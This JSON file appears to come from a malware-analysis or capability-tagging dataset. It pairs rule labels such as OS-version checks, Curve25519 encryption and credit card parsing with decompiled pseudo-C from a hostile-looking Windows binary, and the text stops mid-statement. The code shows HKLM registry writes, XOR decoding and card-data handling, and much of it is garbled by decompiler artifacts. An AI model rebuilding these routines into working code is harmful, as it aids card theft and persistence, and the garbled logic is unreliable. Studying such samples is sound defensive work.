{
    "004010d0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004011df) overlaps instruction at (ram,0x004011de)\n// \n\nuint fcn.004010d0(uint *param_1, int32_t param_2)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint8_t uVar3;\n    uint8_t *puVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uchar *puVar10;\n    uint32_t uVar11;\n    uint *puVar12;\n    uint *puVar13;\n    bool bVar14;\n    uchar uStack616;\n    uint uStack615;\n    char cStack356;\n    uint uStack355;\n    int32_t iStack76;\n    char *pcStack36;\n    uint *puStack28;\n    uint *puStack24;\n    uint *puStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    uStack616 = 0;\n    puVar12 = &uStack615;\n    for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar12 = 0;\n        puVar12 = puVar12 + 1;\n    }\n    *puVar12 = 0;\n    *(puVar12 + 2) = 0;\n    cStack356 = '\\0';\n    puVar12 = &uStack355;\n    for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar12 = 0;\n        puVar12 = puVar12 + 1;\n    }\n    *puVar12 = 0;\n    *(puVar12 + 2) = 0;\n    uStack16 = 1;\n    uStack8 = 0;\n    uStack12 = 1;\n    uVar11 = param_2 != 0;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&cStack356, 0x40708c, param_1);\n    (*pcVar2)(&uStack616, 0x4070a4, param_1);\n    pcStack36 = &cStack356;\n    puStack28 = &uStack16;\n    puStack24 = &uStack8;\n    puStack20 = &uStack12;\n    uVar7 = 0xffffffff;\n    puVar4 = NULL;\n    pcVar5 = &cStack356;\n    do {\n        if (uVar7 == 0) break;\n        uVar7 = uVar7 - 1;\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    iStack76 = ~uVar7 - 1;\n    bVar14 = false;\n    uVar7 = 0xffffffff;\n    puVar12 = param_1;\n    do {\n        puVar10 = &stack0xfffffffc;\n        puVar13 = puVar12;\n        if (uVar7 == 0) break;\n        uVar7 = uVar7 - 1;\n        bVar14 = *puVar12 != '\\0';\n        cVar1 = *puVar12;\n        puVar10 = &stack0xfffffffc;\n        puVar13 = puVar12 + 1;\n        puVar12 = puVar12 + 1;\n    } while (cVar1 != '\\0');\n    do {\n        uVar8 = ~uVar7 - 1;\n        *(puVar10 + -0x34) = 0x4070cc;\n        *(puVar10 + -0x30) = 0x4070d8;\n        *(puVar10 + -0x2c) = 0x4070e4;\n        *(puVar10 + -0x28) = 0x4070f4;\n        *(puVar10 + -0x24) = 0x4070fc;\n        *(puVar10 + -0x5c) = 2;\n        *(puVar10 + -0x58) = 1;\n        *(puVar10 + -0x54) = 4;\n        *(puVar10 + -0x50) = 4;\n        *(puVar10 + -0x4c) = 4;\n        *(puVar10 + -0x1c) = param_1;\n        uVar9 = uVar8;\n        do {\n            *(puVar10 + -0x44) = uVar9;\n            *(puVar10 + -0x40) = 4;\n            *(puVar10 + -0x3c) = 4;\n            *(puVar10 + -0x38) = 4;\n            if ((bVar14) || (!bVar14)) {\n                if (uVar11 < 5) {\n                    uVar11 = uVar11 * 4;\n                    puVar13 = _sym.imp.SHLWAPI.dll_SHSetValueA;\ncode_r0x0040121b:\n                    do {\n                        iVar6 = (*puVar13)(0x80000002, puVar10 + -0x264, *(puVar10 + (uVar11 - 0x34)), \n                                           *(puVar10 + (uVar11 - 0x5c)), *(puVar10 + (uVar11 - 0x20)), \n                                           *(puVar10 + (uVar11 - 0x48)));\n                        if (iVar6 != 0) {\n                            return 0;\n                        }\n                        uVar11 = uVar11 + 4;\n                    } while (uVar11 < 0x14);\n                }\n                return 1;\n            }\n            uVar7 = uVar9 - 1;\n            if (uVar7 == 0 || uVar8 != 0) {\n                *puVar13 = param_1 + 1;\n                uVar11 = 0x83b8ec44;\n                pcVar5 = *0x9750e2b5 + 0x3d8b3b73;\n                *(uVar9 + 0x3f) = *(uVar9 + 0x3f) - (pcVar5 >> 8);\n                puVar10[0x9d34] = puVar10[0x9d34] + uVar7;\n                *pcVar5 = *pcVar5 + pcVar5;\n                goto code_r0x0040121b;\n            }\n            puVar4 = puVar4 & 0xffff0000 | CONCAT11(0x89, puVar4);\n            uVar9 = uVar7;\n        } while (uVar8 == 0);\n        puVar4 = puVar4 + 1;\n        uVar11 = CONCAT11((uVar11 >> 8) + puVar4, uVar11);\n        puVar10 = puVar10 + 1;\n        *puVar13 = *param_1;\n        uVar3 = puVar4 + *puVar4;\n        puVar4 = puVar4 & 0xffffff00 | uVar3;\n        bVar14 = CARRY1(*puVar4, uVar3);\n        *puVar4 = *puVar4 + uVar3;\n        param_1 = param_1 + 1;\n        puVar13 = puVar13 + 1;\n    } while( true );\n}\n",
        "token_count": 1657
    },
    "00402c00": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00402c00(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00402140(0x80000002, 0x4071d8, 0x407224, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 133
    },
    "00402f20": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402f7b) overlaps instruction at (ram,0x00402f78)\n// \n// WARNING: Removing unreachable block (ram,0x00402f72)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.00402f20(int32_t param_1, int32_t param_2, int32_t param_3, int32_t param_4)\n\n{\n    int32_t iStack12;\n    \n    iStack12 = 0;\n    if (0 < param_4) {\n        do {\n            *(iStack12 + param_3) = param_4 ^ *(iStack12 + param_3) ^ *(iStack12 % param_2 + param_1);\n            iStack12 = iStack12 + 1;\n        } while (iStack12 < param_4);\n    }\n    return;\n}\n",
        "token_count": 198
    },
    "00402fe0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403039) overlaps instruction at (ram,0x00403034)\n// \n\nulong fcn.00402fe0(void)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint8_t extraout_CL;\n    uchar *puVar3;\n    bool bVar4;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    uint var_8ch;\n    \n    puVar3 = &stack0xfffffffc;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetVersionExA)();\n    if (var_90h == 5) {\n        return 1;\n    }\n    if ((var_90h < 6) || (5 < var_90h)) {\n        bVar4 = var_90h == 6;\n    }\n    else {\n        puVar1 = iVar2 + -0x7cc625aa;\n        *puVar1 = *puVar1 ^ extraout_CL;\n        bVar4 = *puVar1 == 0;\n        puVar3 = 0xffffff70;\n    }\n    if ((bVar4) && (*(puVar3 + -0x8c) == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 279
    },
    "00403d60": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00403d60(uint s1)\n\n{\n    uint uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uchar **ppuVar4;\n    uchar **ppuVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    bool bVar8;\n    uint64_t uVar9;\n    uchar *apuStack44 [2];\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar6 = &stack0xfffffffc;\n    apuStack44[1] = s1;\n    ppuVar4 = apuStack44 + 1;\n    uVar9 = (*_sym.imp.MSVCRT.dll__strlwr)();\n    apuStack44[1] = uVar9;\n    bVar8 = (uVar9 & 0x120000000000) != 0;\n    ppuVar5 = &stack0xfffffffc;\n    if ((bVar8) && (ppuVar5 = &stack0xfffffffc,  !bVar8)) {\n        apuStack44[1] = &stack0xfffffffc;\n        cVar2 = '\\x10';\n        do {\n            puVar6 = puVar6 + -1;\n            ppuVar4 = ppuVar4 + -1;\n            *ppuVar4 = *puVar6;\n            cVar2 = cVar2 + -1;\n            ppuVar5 = apuStack44 + 1;\n        } while ('\\0' < cVar2);\n    }\n    uVar7 = 0;\n    puVar6 = ppuVar5 + -0x14;\n    do {\n        uVar1 = *(ppuVar5 + 8);\n        iVar3 = (*_sym.imp.MSVCRT.dll_strstr)(uVar1, *puVar6);\n        if (iVar3 != 0) {\n            return true;\n        }\n        uVar7 = uVar7 + 1;\n        puVar6 = puVar6 + 1;\n    } while (uVar7 < 5);\n    iVar3 = (*_sym.imp.MSVCRT.dll_strstr)(uVar1, 0x407430);\n    return iVar3 == 0;\n}\n",
        "token_count": 509
    },
    "00401370": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.00401370(void)\n\n{\n    uint uVar1;\n    \n    if (*0x4235c4 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x4235c4 = 1;\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "004031f0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004032b0) overlaps instruction at (ram,0x004032af)\n// \n\nuint __fastcall fcn.004031f0(uint param_1, int32_t param_2)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint8_t uVar5;\n    uchar uVar6;\n    char *in_EAX;\n    uint *puVar7;\n    int32_t iVar8;\n    uchar *puVar9;\n    uint32_t unaff_ESI;\n    uint *puVar10;\n    uint *unaff_EDI;\n    uchar *puVar11;\n    code *pcVar12;\n    uint in_stack_00000014;\n    uint uStack40;\n    uint uStack24;\n    uint *puStack9;\n    uchar uStack5;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    \n    puVar9 = &stack0xfffffffc;\n    uVar5 = in_EAX >> 8;\n    puVar11 = unaff_EDI ^ *(unaff_EDI + 0xe58be73);\n    *in_EAX = *in_EAX + in_EAX;\n    puVar1 = unaff_ESI + 0x52;\n    uVar2 = *puVar1;\n    uVar3 = *puVar1;\n    *puVar1 = *puVar1 + uVar5;\n    uVar4 = *puVar1;\n    if (SCARRY1(uVar3, uVar5)) {\n        pcVar12 = puVar11 + 1;\n        uVar6 = in(param_2);\n        *puVar11 = uVar6;\n        puVar7 = CONCAT31(&stack0x1e800f72 >> 8, 0xbc);\n        in_stack_00000014 = param_1;\n        if (!CARRY1(uVar2, uVar5) && uVar4 != 0) goto code_r0x00403299;\n    }\n    puVar9 = &uStack5;\n    *(param_2 + 7) = (*(param_2 + 7) - (in_stack_00000014 >> 8)) - CARRY1(uVar2, uVar5);\n    puVar7 = fcn.00404eb0(in_stack_00000014, 0x8b1c458b, 0x407054, 0x56);\n    if (puVar7 == NULL) {\n        return 0;\n    }\n    puVar10 = &uStack40;\n    puStack9 = puVar7;\n    for (iVar8 = 7; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    *(puVar10 + 2) = 0;\n    unaff_ESI = 0;\n    pcVar12 = _sym.imp.MSVCRT.dll_rand;\ncode_r0x00403299:\n    do {\n        uVar6 = (*pcVar12)();\n        puVar9[unaff_ESI - 0x24] = uVar6;\n        unaff_ESI = unaff_ESI + 1;\n    } while (unaff_ESI < 0x20);\n    if ((!SBORROW4(unaff_ESI, 0x20)) && (SBORROW4(unaff_ESI, 0x20))) {\n        *unaff_EDI = uStack24;\n        return uStack24;\n    }\n    puVar10 = puVar9 + -0x24;\n    for (iVar8 = 8; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar7 = *puVar10;\n        puVar10 = puVar10 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    fcn.00402c50();\n    fcn.004012e0(*(puVar9 + 0x18), *(puVar9 + 0x1c));\n    return 1;\n}\n",
        "token_count": 902
    },
    "00405040": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00405040(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00401370();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.004036f0();\n        arg_ch_01 = fcn.004036f0();\n        arg_ch_02 = fcn.004036f0();\n        fcn.004029e0(arg_10h, arg_ch_00);\n        fcn.004029e0(arg_8h, arg_ch_01);\n        fcn.004029e0(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x407024, &lpBuffer, arg_10h);\n        iVar2 = fcn.004051a0(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x407030, &lpBuffer, arg_8h);\n            iVar2 = fcn.004051a0(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x407030, &lpBuffer, arg_ch);\n                iVar2 = fcn.004051a0(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.004029e0(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 615
    },
    "004013d0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401439) overlaps instruction at (ram,0x00401438)\n// \n// WARNING: Removing unreachable block (ram,0x00401433)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004013d0(uint param_1, int32_t param_2)\n\n{\n    char *pcVar1;\n    uchar uVar2;\n    int32_t *piVar3;\n    int32_t **ppiVar4;\n    unkbyte3 Var5;\n    uint32_t *puVar6;\n    uint uVar7;\n    uint8_t *puVar8;\n    int32_t *piVar9;\n    uint8_t extraout_CL;\n    uint16_t uVar10;\n    uint8_t uVar13;\n    uchar *extraout_ECX;\n    uchar *puVar11;\n    uchar *extraout_ECX_00;\n    uint extraout_ECX_01;\n    int32_t extraout_ECX_02;\n    char extraout_CH;\n    char extraout_CH_00;\n    int32_t extraout_ECX_03;\n    int32_t iVar12;\n    uint8_t extraout_CH_01;\n    int32_t extraout_ECX_04;\n    uint8_t extraout_DL;\n    ushort extraout_DX;\n    int32_t extraout_EDX;\n    int32_t iVar14;\n    int32_t extraout_EDX_00;\n    uint8_t extraout_DH;\n    int32_t extraout_EDX_01;\n    int32_t extraout_EDX_02;\n    int32_t extraout_EDX_03;\n    int32_t extraout_EDX_04;\n    uint8_t *unaff_EBX;\n    uint8_t *puVar15;\n    uint32_t uVar16;\n    int32_t *unaff_ESI;\n    int32_t *piVar17;\n    int32_t *unaff_EDI;\n    int32_t *piVar18;\n    int32_t **ppiVar19;\n    ushort in_SS;\n    bool in_CF;\n    uchar uVar20;\n    bool bVar21;\n    uint8_t in_AF;\n    bool in_ZF;\n    uchar uVar22;\n    char cVar23;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uchar uVar24;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    float10 extraout_ST0;\n    float10 extraout_ST0_00;\n    float10 fVar25;\n    ulong uVar26;\n    int16_t iStack00000014;\n    uint8_t in_stack_00000018;\n    uchar uStack0000001f;\n    uchar uStack00000022;\n    uint *puStack00000023;\n    uchar uStack00000027;\n    uchar uStack0000002a;\n    uint uStack0000002f;\n    uint uStack0000003f;\n    ulong in_stack_0000003c;\n    uint uStack32;\n    uint uStack28;\n    uint32_t uStack24;\n    uchar uStack20;\n    uchar uStack19;\n    uchar uStack18;\n    uchar uStack17;\n    ushort uStack16;\n    uchar uStack14;\n    uint uStack13;\n    uchar uStack9;\n    uchar uStack8;\n    uchar uStack7;\n    uchar uStack6;\n    uchar uStack5;\n    uchar uStack4;\n    ushort uStack3;\n    uchar uStack1;\n    \n    uVar13 = param_1 >> 8;\n    uStack4 = SUB41(unaff_EBX, 0);\n    uStack3 = unaff_EBX >> 8;\n    uStack1 = unaff_EBX >> 0x18;\n    uStack8 = SUB41(unaff_ESI, 0);\n    uStack7 = unaff_ESI >> 8;\n    uStack6 = unaff_ESI >> 0x10;\n    uStack5 = unaff_ESI >> 0x18;\n    uStack13._1_3_ = unaff_EDI;\n    uStack9 = unaff_EDI >> 0x18;\n    if ((in_CF || in_ZF) || (!in_CF && !in_ZF)) {\n        uStack16 = 10;\n        uStack14 = 0;\n        uStack13._0_1_ = 0;\n        uStack20 = 0x24;\n        uStack19 = 0x70;\n        uStack18 = 0x40;\n        uStack17 = 0;\n        uStack24 = 0xf;\n    }\n    else {\n        *unaff_EDI = *unaff_ESI;\n        unaff_EBX = unaff_EBX & 0xffff0000 | CONCAT11(0xdf, uStack4);\n        uVar13 = uVar13 | in_stack_00000018;\n        unaff_ESI = unaff_ESI + 1;\n        unaff_EDI = unaff_EDI + 1;\n    }\n    *(param_2 + 0xf) = *(param_2 + 0xf) + uVar13;\n    uStack28 = 0x407490;\n    uStack32 = 0x401400;\n    fcn.00402f20();\n    uVar20 = extraout_CL < extraout_DL;\n    uVar24 = SBORROW1(extraout_CL, '\\x01');\n    uVar22 = extraout_CL == 1;\n    uStack16 = 0x12;\n    uStack14 = 0;\n    uStack13 = uStack13._1_3_ << 8;\n    uStack20 = 0x30;\n    uStack19 = 0x70;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xf;\n    uStack28 = 0x407490;\n    uStack32 = 0x401430;\n    fcn.00402f20();\n    puVar11 = extraout_ECX;\n    iVar14 = extraout_EDX;\n    puVar15 = unaff_EBX;\n    piVar18 = unaff_EDI;\n    if (uVar24) goto code_r0x00401454;\n    while (puVar15 = unaff_EBX,  piVar18 = unaff_EDI,  !uVar24) {\ncode_r0x00401454:\n        uStack32 = 4;\ncode_r0x0040145a:\n        puVar8 = iVar14 + 0xf;\n        uVar13 = puVar11 >> 8;\n        bVar21 = CARRY1(*puVar8, uVar13);\n        uVar24 = SCARRY1(*puVar8, uVar13);\n        *puVar8 = *puVar8 + uVar13;\n        uStack4 = 0x90;\n        uStack3 = 0x4074;\n        uStack1 = 0;\n        uStack8 = 0x67;\n        uStack7 = 0x14;\n        uStack6 = 0x40;\n        uStack5 = 0;\n        puVar6 = fcn.00402f20();\n        if (bVar21) {\ncode_r0x0040148c:\n            uStack8 = 0xc;\n            uStack7 = 0;\n            uStack6 = 0;\n            uStack5 = 0;\n            uStack9 = 0;\n            uStack16 = 0xf;\n            uStack14 = 0;\n            uStack13 = 0x40704800;\n            uStack20 = 0x90;\n            uStack19 = 0x74;\n            uStack18 = 0x40;\n            uStack17 = 0;\ncode_r0x0040149a:\n            uStack24 = 0x40149f;\n            fcn.00402f20();\n            if ((uVar24) || (!uVar24)) {\n                uStack20 = 7;\n                uStack19 = 0;\n                uStack18 = 0;\n                uStack17 = 0;\n            }\n            uStack24 = 0x407054;\n            uStack28 = 0xf;\n            goto code_r0x004014bf;\n        }\n        uStack6 = SUB41(piVar18, 0);\n        uStack5 = piVar18 >> 8;\n        if (!bVar21) goto code_r0x0040148c;\n        uVar20 = &stack0xfffffffc < *puVar6;\n        uVar24 = SCARRY4(puVar6, 1);\n        uVar22 = puVar6 == 0xffffffff;\n        uStack28 = 0xb7f8c08b;\n        if (uVar20 || uVar22) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        iVar14 = 0x5a667a78;\n        puVar11 = extraout_ECX_00;\n        unaff_EBX = puVar15;\n        unaff_EDI = piVar18;\n    }\n    piVar18 = unaff_EDI + 1;\n    uVar2 = in(iVar14);\n    *unaff_EDI = uVar2;\n    puVar15 = CONCAT31(unaff_EBX >> 8, 0xbc);\n    if (uVar20 || uVar22) {\n        uStack32 = 0x56;\n        puVar15 = unaff_EBX & 0xffff0000 | CONCAT11(*puVar11, 0xbc);\n        if (!uVar24) goto code_r0x0040145a;\n        goto code_r0x0040149a;\n    }\ncode_r0x004014bf:\n    uStack32 = 0x407490;\n    uVar26 = fcn.00402f20();\n    iVar14 = uVar26 >> 0x20;\n    uVar20 = 0xffffffbf < &stack0xffffffe0;\n    uVar13 = extraout_ECX_01 >> 8;\n    if ((SCARRY4(&stack0xffffffe0, 0x40)) ||\n       (uStack0000001f = extraout_ECX_01 >> 0x18,  !SCARRY4(&stack0xffffffe0, 0x40))) {\n        uStack0000001f = 0;\n        piVar9 = unaff_ESI;\ncode_r0x004014e0:\n        puVar8 = iVar14 + 0xf;\n        uVar20 = CARRY1(*puVar8, uVar13);\n        *puVar8 = *puVar8 + uVar13;\n        uVar22 = *puVar8 < '\\0';\n        bVar21 = (POPCOUNT(*puVar8) & 1U) == 0;\n        uVar26 = fcn.00402f20();\n        puVar6 = uVar26 >> 0x20;\n        uVar7 = uVar26;\n        if ((bVar21) || (!bVar21)) {\n            uStack4 = 0x17;\n            uStack3 = 0x4015;\n            uStack1 = 0;\n            fVar25 = fcn.00402f20();\n        }\n        else {\n            out(*piVar9, uVar26 >> 0x20);\n            do {\n                cVar23 = uVar7 >> 8;\n                in_AF = 9 < (uVar7 & 0xf) | in_AF;\n                Var5 = CONCAT21(uVar7 >> 0x10, cVar23 - in_AF);\n                uVar7 = CONCAT31(Var5, -in_AF);\n            } while (in_AF || cVar23 == *puVar6);\n            piVar17 = piVar18 + puVar6 * 2;\n            *piVar17 = (*piVar17 + 0x7b) - in_AF;\n            *(extraout_ECX_02 + 0x6a) = uVar7;\n            puVar8 = CONCAT31(Var5, -in_AF) | 0x68;\n            *puVar6 = *puVar6 | puVar15;\n            uVar20 = CARRY1(*puVar8, puVar8);\n            *puVar8 = *puVar8 + puVar8;\n            uVar22 = *puVar8 < '\\0';\n            piVar9 = piVar9 + 1;\n            fVar25 = extraout_ST0_00;\n        }\n        if (!uVar22) goto code_r0x00401520;\n    }\n    else {\n        uVar22 = uVar26 + 1 < 0;\n        piVar17 = piVar18 + 1;\n        piVar9 = unaff_ESI + 1;\n        *piVar18 = *unaff_ESI;\n        iVar14 = 0x5c680b6a;\n        piVar18 = piVar17;\n        fVar25 = extraout_ST0;\n        if (!SCARRY4(uVar26, 1)) goto code_r0x004014e0;\ncode_r0x00401520:\n        if (uVar22) {\n            piVar3 = piVar18 + 1;\n            piVar17 = piVar9 + 1;\n            *(piVar18 + 7) = fVar25;\n            piVar18 = piVar18 + 5;\n            piVar9 = piVar9 + 5;\n            uVar20 = *piVar17 < *piVar3;\n        }\n    }\n    uStack4 = 8;\n    uStack3 = 0;\n    uStack1 = 0;\n    uStack8 = 0x74;\n    uStack7 = 0x70;\n    uStack6 = 0x40;\n    uStack5 = 0;\n    uStack9 = 0;\n    uStack16 = 0x7490;\n    uStack14 = 0x40;\n    uStack13 = 0xf00;\n    uStack20 = 0x3b;\n    uStack19 = 0x15;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uVar13 = fcn.00402f20();\n    if (uVar20) {\ncode_r0x00401553:\n        uStack20 = 0xd;\n        uStack19 = 0;\n        uStack18 = 0;\n        uStack17 = 0;\n    }\n    else {\n        uStack18 = SUB41(piVar18, 0);\n        uStack17 = piVar18 >> 8;\n        if (!uVar20) goto code_r0x00401553;\n    }\n    ppiVar19 = piVar18 + 1;\n    cVar23 = uVar13 - *piVar18;\n    uStack24 = (in_NT & 1) * 0x4000 | SBORROW1(uVar13, *piVar18) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n               (cVar23 < '\\0') * 0x80 | (cVar23 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n               ((POPCOUNT(cVar23) & 1U) == 0) * 4 | uVar13 < *piVar18 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000\n               | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    piVar17 = piVar9 + -1;\n    uStack28 = 0x40154d;\n    func_0x101874c5();\n    uVar16 = extraout_EDX_00 + 0xd;\n    uStack28 = 0x40707c;\n    uStack32 = 0xf;\n    fcn.00402f20(0x407490);\n    if ((*0x10 != 0xffffffe4) && (*0x10 == 0xffffffe4)) {\n        out(*piVar17, extraout_DX);\n        piVar17 = piVar9;\n    }\n    fcn.00402f20();\n    fcn.00402f20();\n    fcn.00402f20();\n    while( true ) {\n        fcn.00402f20();\n        uStack4 = SUB41(ppiVar19, 0);\n        uStack3 = ppiVar19 >> 8;\n        uStack1 = ppiVar19 >> 0x18;\n        uVar20 = extraout_DH < 0x36;\n        uVar22 = SBORROW1(extraout_DH, '6');\n        bVar21 = (POPCOUNT(extraout_DH - 0x36) & 1U) == 0;\n        fcn.00402f20();\n        if ((bVar21) || (!bVar21)) goto code_r0x0040164e;\n        ppiVar4 = segment(in_SS, *0x10 + 0xc);\n        piVar9 = *ppiVar4;\n        iVar14 = -0x4843615b;\n        cVar23 = extraout_CH;\n        if (uVar20) goto code_r0x0040166f;\n        if (!bVar21) break;\n        *piVar9 = (*piVar9 - piVar9) - uVar20;\n        puVar15[0x525010c4] = puVar15[0x525010c4] + piVar9;\n    }\n    uVar20 = 0;\ncode_r0x0040164e:\n    uStack4 = 0x90;\n    uStack3 = 0x4074;\n    uStack1 = 0;\n    uStack8 = 0x61;\n    uStack7 = 0x16;\n    uStack6 = 0x40;\n    uStack5 = 0;\n    fcn.00402f20();\n    iVar14 = extraout_EDX_01;\n    cVar23 = extraout_CH_00;\n    if ((uVar20) || (!uVar20)) {\n        uStack8 = 5;\n        uStack7 = 0;\n        uStack6 = 0;\n        uStack5 = 0;\n        uStack9 = 0;\n        uStack16 = 0xf;\n        uStack14 = 0;\n        uStack13 = 0x4070fc00;\n    }\n    else {\n        uVar22 = false;\n        ppiVar19 = ppiVar19 ^ piVar18[0x3962f9d];\ncode_r0x0040166f:\n        puVar15 = extraout_EDX_00 + 0x68056a83;\n        if (uVar22) goto code_r0x004016b8;\n    }\n    pcVar1 = iVar14 + 0xf;\n    bVar21 = SCARRY1(*pcVar1, cVar23);\n    *pcVar1 = *pcVar1 + cVar23;\n    uStack20 = 0x90;\n    uStack19 = 0x74;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0x401685;\n    fcn.00402f20();\n    if ((!bVar21) && (bVar21)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uStack24 = 0xd;\n    uStack28 = 0x407104;\n    uStack32 = 0xf;\n    fcn.00402f20(0x407490);\ncode_r0x004016b8:\n    fcn.00402f20();\n    fcn.00402f20();\n    iStack00000014 = ppiVar19;\n    uVar20 = 0;\n    cVar23 = iStack00000014 == 0;\n    do {\n        fcn.00402f20();\n        iVar12 = extraout_ECX_03;\n        iVar14 = extraout_EDX_02;\n        if ((uVar20) || (!uVar20)) goto code_r0x00401778;\n        iVar12 = extraout_ECX_03 + -1;\n    } while (iVar12 != 0 && cVar23 != '\\0');\n    iVar14 = *piVar17;\n    *ppiVar19 = piVar17 + 1;\n    iVar14 = iVar14 >> 0x1f;\n    uVar16 = uVar16 | *(*0x9750e2b5 + 0x50);\n    **0x9750e2b5 = **0x9750e2b5 + *0x9750e2b5;\ncode_r0x00401778:\n    *(iVar14 + 0xf) = *(iVar14 + 0xf) + (iVar12 >> 8);\n    fcn.00402f20();\n    uStack0000002a = 0;\n    uStack00000027 = 0;\n    uStack00000022 = 0;\n    puStack00000023 = 0x40715c00;\n    uStack0000001f = 0;\n    fcn.00402f20();\n    *puVar15 = *puVar15 & 0xc3;\n    fcn.00402f20();\n    uStack4 = 0x90;\n    uStack3 = 0x4074;\n    uStack1 = 0;\n    uStack8 = 0xfd;\n    uStack7 = 0x17;\n    uStack6 = 0x40;\n    uStack5 = 0;\n    fcn.00402f20();\n    uStack0000002a = 0;\n    uStack00000027 = 0;\n    uStack00000022 = 0;\n    puStack00000023 = 0x40718000;\n    uStack0000001f = 0;\n    fcn.00402f20();\n    uStack0000002a = 0;\n    uStack00000027 = 0;\n    uStack00000022 = 0;\n    puStack00000023 = 0x40718c00;\n    uStack0000001f = 0;\n    fcn.00402f20();\n    fcn.00402f20();\n    uStack00000027 = 0xb0;\n    uStack0000002a = 0;\n    puStack00000023 = 0xf;\n    uStack0000001f = 0x90;\n    uStack00000022 = 0;\n    fcn.00402f20();\n    *puVar15 = *puVar15 & 0xc3;\n    puVar6 = 